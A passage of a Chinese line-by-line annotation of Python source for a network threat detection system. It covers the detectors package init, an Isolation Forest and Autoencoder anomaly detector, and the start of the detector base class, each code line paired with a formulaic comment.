| 143 | 代码语句：参与当前文件的业务流程或数据处理。 | `            },` |
| 144 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |

## `src/detectors/__init__.py`

- 类型：检测模型/规则
- 行数：12

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 代码语句：参与当前文件的业务流程或数据处理。 | `﻿"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `src.detectors 包初始化` |
| 3 | 代码语句：参与当前文件的业务流程或数据处理。 | `对应架构文档 §5 威胁检测层` |
| 4 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 5 | 代码语句：参与当前文件的业务流程或数据处理。 | `导出常用的检测结果数据类和检测引擎基类，便于其他模块直接从 \`src.detectors\` 导入。` |
| 6 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 7 | 导入对象：从指定模块引入类、函数或常量。 | `from .base import BaseDetector, DetectionResult` |
| 8 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 9 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `__all__ = [` |
| 10 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "BaseDetector",` |
| 11 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "DetectionResult",` |
| 12 | 代码语句：参与当前文件的业务流程或数据处理。 | `]` |

## `src/detectors/anomaly_detector.py`

- 类型：检测模型/规则
- 行数：270

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `异常行为检测引擎` |
| 3 | 代码语句：参与当前文件的业务流程或数据处理。 | `对应架构文档 §5.4.4 异常行为检测` |
| 4 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 5 | 代码语句：参与当前文件的业务流程或数据处理。 | `Isolation Forest / Autoencoder 须加载 \`\`anomaly_if_v1.model_manifest.json\`\`。` |
| 6 | 代码语句：参与当前文件的业务流程或数据处理。 | `生产 tabular：manifest.feature_columns 顺序即推理矩阵列顺序，禁止缺键静默填 0。` |
| 7 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 8 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 9 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 10 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import logging` |
| 11 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 12 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import time` |
| 13 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import Dict, List, Optional` |
| 14 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 15 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import joblib` |
| 16 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import numpy as np` |
| 17 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 18 | 导入对象：从指定模块引入类、函数或常量。 | `from src.schema.feature_schemas import (` |
| 19 | 代码语句：参与当前文件的业务流程或数据处理。 | `    production_tabular_keys_present,` |
| 20 | 代码语句：参与当前文件的业务流程或数据处理。 | `    validate_payload_against_schema,` |
| 21 | 函数调用：执行已有函数/方法完成当前步骤。 | `)` |
| 22 | 导入对象：从指定模块引入类、函数或常量。 | `from src.schema.inference_guard import ml_degraded_normal` |
| 23 | 导入对象：从指定模块引入类、函数或常量。 | `from src.schema.manifest import ManifestLoadError, ModelManifest, resolve_model_entry` |
| 24 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 25 | 导入对象：从指定模块引入类、函数或常量。 | `from .base import BaseDetector, DetectionResult` |
| 26 | 导入对象：从指定模块引入类、函数或常量。 | `from .inference_meta import set_inference_meta` |
| 27 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 28 | 日志记录：输出运行状态、调试信息或异常线索。 | `logger = logging.getLogger(__name__)` |
| 29 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 30 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 31 | 类定义：声明 `AnomalyDetector`，封装相关状态与行为。 | `class AnomalyDetector(BaseDetector):` |
| 32 | 文档字符串：说明当前模块、类或函数的职责。 | `    """异常行为检测引擎（Isolation Forest + Autoencoder）。"""` |
| 33 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 34 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    _IF_FILENAME = "anomaly_if_v1.pkl"` |
| 35 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    _AE_DIRNAME = "anomaly_ae_v1"` |
| 36 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    _AE_SCALER_FILENAME = "anomaly_ae_scaler_v1.pkl"` |
| 37 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    _AE_THRESHOLD_FILENAME = "anomaly_ae_threshold_v1.pkl"` |
| 38 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 39 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    _DEFAULT_FEATURE_ORDER: List[str] = [` |
| 40 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "pkt_len_mean",` |
| 41 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "flow_byte_count",` |
| 42 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "flow_pkt_count",` |
| 43 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "window_unique_dst_port",` |
| 44 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "syn_count",` |
| 45 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ]` |
| 46 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 47 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    _SINGLE_MODEL_SCORE: float = 0.5` |
| 48 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    _HIGH_SCORE_THRESHOLD: float = 0.7` |
| 49 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 50 | 函数定义：声明 `__init__` 的输入、处理逻辑和返回结果。 | `    def __init__(self) -> None:` |
| 51 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.if_model = None` |
| 52 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.ae_model = None` |
| 53 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.ae_scaler = None` |
| 54 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.ae_threshold: Optional[float] = None` |
| 55 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._manifest: Optional[ModelManifest] = None` |
| 56 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._feature_order: List[str] = list(self._DEFAULT_FEATURE_ORDER)` |
| 57 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 58 | 函数定义：声明 `clear_ml_state` 的输入、处理逻辑和返回结果。 | `    def clear_ml_state(self) -> None:` |
| 59 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.if_model = None` |
| 60 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.ae_model = None` |
| 61 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.ae_scaler = None` |
| 62 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.ae_threshold = None` |
| 63 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._manifest = None` |
| 64 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._feature_order = list(self._DEFAULT_FEATURE_ORDER)` |
| 65 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 66 | 函数定义：声明 `load_model` 的输入、处理逻辑和返回结果。 | `    def load_model(self, model_path: str) -> None:` |
| 67 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self.clear_ml_state()` |
| 68 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 69 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ap, manifest = resolve_model_entry(model_path)` |
| 70 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except ManifestLoadError as exc:` |
| 71 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.error("[AUDIT] Anomaly 模型拒绝加载（manifest 无效）: %s", exc)` |
| 72 | 代码语句：参与当前文件的业务流程或数据处理。 | `            raise` |
| 73 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 74 | 条件判断：满足条件时进入对应分支。 | `        if manifest.model_input_mode != "tabular":` |
| 75 | 抛出异常：主动报告不可继续的错误。 | `            raise ManifestLoadError("AnomalyDetector 仅支持 model_input_mode=tabular")` |
| 76 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 77 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        model_dir = os.path.dirname(ap)` |
| 78 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 79 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        if_path = os.path.join(model_dir, self._IF_FILENAME)` |
| 80 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        if_model = None` |
| 81 | 条件判断：满足条件时进入对应分支。 | `        if os.path.exists(if_path):` |
| 82 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            if_model = joblib.load(if_path)` |
| 83 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            n_if = getattr(if_model, "n_features_in_", len(manifest.feature_columns))` |
| 84 | 条件判断：满足条件时进入对应分支。 | `            if int(n_if) != len(manifest.feature_columns):` |
| 85 | 抛出异常：主动报告不可继续的错误。 | `                raise ManifestLoadError(` |
| 86 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    f"IF n_features_in_={n_if} 与 manifest 列数 {len(manifest.feature_columns)} 不一致"` |
| 87 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 88 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.info("[AnomalyDetector] Isolation Forest 加载成功: %s", if_path)` |
| 89 | 兜底分支：处理前面条件都不满足的情况。 | `        else:` |
| 90 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.warning("[AnomalyDetector] 未找到 Isolation Forest 模型: %s", if_path)` |
| 91 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 92 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ae_dir = os.path.join(model_dir, self._AE_DIRNAME)` |
| 93 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ae_scaler_path = os.path.join(model_dir, self._AE_SCALER_FILENAME)` |
| 94 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ae_threshold_path = os.path.join(model_dir, self._AE_THRESHOLD_FILENAME)` |
| 95 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ae_model = None` |
| 96 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ae_scaler = None` |
| 97 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ae_threshold: Optional[float] = None` |
| 98 | 条件判断：满足条件时进入对应分支。 | `        if (` |
| 99 | 函数调用：执行已有函数/方法完成当前步骤。 | `            os.path.exists(ae_dir)` |
| 100 | 函数调用：执行已有函数/方法完成当前步骤。 | `            and os.path.exists(ae_scaler_path)` |
| 101 | 函数调用：执行已有函数/方法完成当前步骤。 | `            and os.path.exists(ae_threshold_path)` |
| 102 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ):` |
| 103 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `            import tensorflow as tf  # noqa: WPS433` |
| 104 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 105 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            ae_model = tf.keras.models.load_model(ae_dir)` |
| 106 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            ae_scaler = joblib.load(ae_scaler_path)` |
| 107 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            ae_threshold = float(joblib.load(ae_threshold_path))` |
| 108 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.info(` |
| 109 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "[AnomalyDetector] Autoencoder 加载成功: %s (threshold=%.6f)",` |
| 110 | 代码语句：参与当前文件的业务流程或数据处理。 | `                ae_dir,` |
| 111 | 代码语句：参与当前文件的业务流程或数据处理。 | `                ae_threshold,` |
| 112 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 113 | 兜底分支：处理前面条件都不满足的情况。 | `        else:` |
| 114 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.warning("[AnomalyDetector] 未找到 Autoencoder 模型文件")` |
| 115 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 116 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._manifest = manifest` |
| 117 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._feature_order = list(manifest.feature_columns)` |
| 118 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.if_model = if_model` |
| 119 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.ae_model = ae_model` |
| 120 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.ae_scaler = ae_scaler` |
| 121 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.ae_threshold = ae_threshold` |
| 122 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 123 | 装饰器：为下面的函数或类附加框架行为。 | `    @property` |
| 124 | 函数定义：声明 `is_ready` 的输入、处理逻辑和返回结果。 | `    def is_ready(self) -> bool:` |
| 125 | 返回结果：把处理后的值交回调用方。 | `        return self.if_model is not None or self.ae_model is not None` |
| 126 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 127 | 函数定义：声明 `detect` 的输入、处理逻辑和返回结果。 | `    def detect(self, features: Dict) -> Optional[DetectionResult]:` |
| 128 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        t0 = time.perf_counter()` |
| 129 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 130 | 函数定义：声明 `finish` 的输入、处理逻辑和返回结果。 | `        def finish(res: Optional[DetectionResult]) -> Optional[DetectionResult]:` |
| 131 | 返回结果：把处理后的值交回调用方。 | `            return set_inference_meta(` |
| 132 | 代码语句：参与当前文件的业务流程或数据处理。 | `                res,` |
| 133 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                engine="AnomalyDetector",` |
| 134 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                manifest=self._manifest,` |
| 135 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                latency_ms=(time.perf_counter() - t0) * 1000.0,` |
| 136 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 137 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 138 | 条件判断：满足条件时进入对应分支。 | `        if not self.is_ready:` |
| 139 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.debug("[AnomalyDetector] 双模型均未加载，返回 None")` |
| 140 | 返回结果：把处理后的值交回调用方。 | `            return finish(None)` |
| 141 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 142 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        m = self._manifest` |
| 143 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        src_ip = str(features.get("src_ip", "") or "").strip()` |
| 144 | 条件判断：满足条件时进入对应分支。 | `        if not src_ip:` |
| 145 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            nf = features.get("network_flow_v1")` |
| 146 | 条件判断：满足条件时进入对应分支。 | `            if isinstance(nf, dict):` |
| 147 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                src_ip = str(nf.get("src_ip", "") or "").strip()` |
| 148 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 149 | 条件判断：满足条件时进入对应分支。 | `        if m is not None:` |
| 150 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ok_schema, schema_errs = validate_payload_against_schema(` |
| 151 | 代码语句：参与当前文件的业务流程或数据处理。 | `                "network_flow_v1", features` |
| 152 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 153 | 条件判断：满足条件时进入对应分支。 | `            if not ok_schema:` |
| 154 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.warning(` |
| 155 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "[AUDIT] Anomaly network_flow_v1 契约失败: %s ip=%s",` |
| 156 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    schema_errs,` |
| 157 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    src_ip,` |
| 158 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 159 | 返回结果：把处理后的值交回调用方。 | `                return finish(` |
| 160 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    ml_degraded_normal(` |
| 161 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        engine="AnomalyDetector",` |
| 162 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        reason="network_flow_v1 契约失败: " + "; ".join(schema_errs),` |
| 163 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        source_ip=src_ip,` |
| 164 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        extra={"schema_errors": schema_errs},` |
| 165 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    )` |
| 166 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 167 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 168 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        order = self._feature_order if m is not None else self._DEFAULT_FEATURE_ORDER` |
| 169 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 170 | 条件判断：满足条件时进入对应分支。 | `        if m is not None and m.trust_tier != "production":` |
| 171 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.warning("[AUDIT] Anomaly 仅支持 trust_tier=production（拒绝 NSL 原型混淆）")` |
| 172 | 返回结果：把处理后的值交回调用方。 | `            return finish(` |
| 173 | 函数调用：执行已有函数/方法完成当前步骤。 | `                ml_degraded_normal(` |
| 174 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    engine="AnomalyDetector",` |
| 175 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    reason="manifest trust_tier 必须为 production",` |
| 176 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    source_ip=src_ip,` |
| 177 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 178 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 179 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 180 | 条件判断：满足条件时进入对应分支。 | `        if m is not None:` |
| 181 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ok_keys, missing = production_tabular_keys_present(order, features)` |
| 182 | 条件判断：满足条件时进入对应分支。 | `            if not ok_keys:` |
| 183 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.warning(` |
| 184 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "[AUDIT] Anomaly 生产 ML 缺字段: %s ip=%s", missing, src_ip` |
| 185 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 186 | 返回结果：把处理后的值交回调用方。 | `                return finish(` |
| 187 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    ml_degraded_normal(` |
| 188 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        engine="AnomalyDetector",` |
| 189 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        reason="在线特征缺字段: " + ", ".join(missing),` |
| 190 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        source_ip=src_ip,` |
| 191 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        extra={"missing_columns": missing},` |
| 192 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    )` |
| 193 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 194 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 195 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        flat: Dict = dict(features)` |
| 196 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        nf = features.get("network_flow_v1")` |
| 197 | 条件判断：满足条件时进入对应分支。 | `        if isinstance(nf, dict):` |
| 198 | 循环：逐个处理集合或迭代器中的元素。 | `            for k, v in nf.items():` |
| 199 | 条件判断：满足条件时进入对应分支。 | `                if k not in ("schema_name", "schema_version", "schema"):` |
| 200 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    flat.setdefault(k, v)` |
| 201 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 202 | 条件判断：满足条件时进入对应分支。 | `        if m is not None:` |
| 203 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            feature_values = [float(flat[k]) for k in order]` |
| 204 | 兜底分支：处理前面条件都不满足的情况。 | `        else:` |
| 205 | 注释：解释下面或当前这段代码的设计意图。 | `            # 单测直接注入子模型、未走 load_model 时无 manifest` |
| 206 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            feature_values = [float(flat.get(k, 0) or 0) for k in self._DEFAULT_FEATURE_ORDER]` |
| 207 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        X = np.array([feature_values], dtype=np.float32)` |
| 208 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 209 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        anomaly_score = 0.0` |
| 210 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        model_hits: List[str] = []` |
| 211 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 212 | 条件判断：满足条件时进入对应分支。 | `        if self.if_model is not None:` |
| 213 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 214 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                if_pred = self.if_model.predict(X)[0]` |
| 215 | 条件判断：满足条件时进入对应分支。 | `                if int(if_pred) == -1:` |
| 216 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    anomaly_score += self._SINGLE_MODEL_SCORE` |
| 217 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    model_hits.append("IsolationForest")` |
| 218 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception as exc:` |
| 219 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.error("[AnomalyDetector] IsolationForest 推理失败: %s", exc)` |
| 220 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 221 | 条件判断：满足条件时进入对应分支。 | `        if (` |
| 222 | 代码语句：参与当前文件的业务流程或数据处理。 | `            self.ae_model is not None` |
| 223 | 代码语句：参与当前文件的业务流程或数据处理。 | `            and self.ae_scaler is not None` |
| 224 | 代码语句：参与当前文件的业务流程或数据处理。 | `            and self.ae_threshold is not None` |
| 225 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ):` |
| 226 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 227 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                X_scaled = self.ae_scaler.transform(X)` |
| 228 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                reconstruction = self.ae_model.predict(X_scaled, verbose=0)` |
| 229 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                mse = float(np.mean(np.power(X_scaled - reconstruction, 2), axis=1)[0])` |
| 230 | 条件判断：满足条件时进入对应分支。 | `                if mse > self.ae_threshold:` |
| 231 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    anomaly_score += self._SINGLE_MODEL_SCORE` |
| 232 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    model_hits.append(f"Autoencoder(mse={mse:.6f})")` |
| 233 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception as exc:` |
| 234 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.error("[AnomalyDetector] Autoencoder 推理失败: %s", exc)` |
| 235 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 236 | 条件判断：满足条件时进入对应分支。 | `        if anomaly_score <= 0:` |
| 237 | 返回结果：把处理后的值交回调用方。 | `            return finish(` |
| 238 | 函数调用：执行已有函数/方法完成当前步骤。 | `                DetectionResult(` |
| 239 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    threat_type="normal",` |
| 240 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    threat_level="low",` |
| 241 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    confidence=0.9,` |
| 242 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    details="异常检测：行为正常",` |
| 243 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    source_ip=src_ip,` |
| 244 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    raw_data={"anomaly_score": 0.0},` |
| 245 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 246 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 247 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 248 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        threat_level = "high" if anomaly_score > self._HIGH_SCORE_THRESHOLD else "medium"` |
| 249 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        confidence = min(anomaly_score, 1.0)` |
| 250 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        details = (` |
| 251 | 代码语句：参与当前文件的业务流程或数据处理。 | `            f"异常行为检测：综合异常分数={anomaly_score:.2f}，"` |
| 252 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            f"命中模型=[{', '.join(model_hits)}]"` |
| 253 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 254 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.info(` |
| 255 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "[AnomalyDetector] 检出异常 score=%.2f level=%s hits=%s ip=%s",` |
| 256 | 代码语句：参与当前文件的业务流程或数据处理。 | `            anomaly_score,` |
| 257 | 代码语句：参与当前文件的业务流程或数据处理。 | `            threat_level,` |
| 258 | 代码语句：参与当前文件的业务流程或数据处理。 | `            model_hits,` |
| 259 | 代码语句：参与当前文件的业务流程或数据处理。 | `            src_ip,` |
| 260 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 261 | 返回结果：把处理后的值交回调用方。 | `        return finish(` |
| 262 | 函数调用：执行已有函数/方法完成当前步骤。 | `            DetectionResult(` |
| 263 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                threat_type="anomaly",` |
| 264 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                threat_level=threat_level,` |
| 265 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                confidence=confidence,` |
| 266 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                details=details,` |
| 267 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                source_ip=src_ip,` |
| 268 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                raw_data={"anomaly_score": anomaly_score, "hits": model_hits},` |
| 269 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 270 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |

## `src/detectors/base.py`

- 类型：检测模型/规则
- 行数：94

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `检测引擎基类与检测结果数据类` |
| 3 | 代码语句：参与当前文件的业务流程或数据处理。 | `对应架构文档 §5.3 检测引擎抽象接口` |
| 4 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 5 | 代码语句：参与当前文件的业务流程或数据处理。 | `本模块定义了所有检测引擎的统一数据契约：` |
| 6 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - DetectionResult：单次检测输出的结构化结果` |
| 7 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - BaseDetector：所有检测引擎必须继承的抽象基类` |
| 8 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 9 | 代码语句：参与当前文件的业务流程或数据处理。 | `后续 DDoS / 入侵 / Web 攻击 / 异常行为四类检测引擎都基于本模块构建。` |
| 10 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 11 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 12 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 13 | 导入对象：从指定模块引入类、函数或常量。 | `from abc import ABC, abstractmethod` |
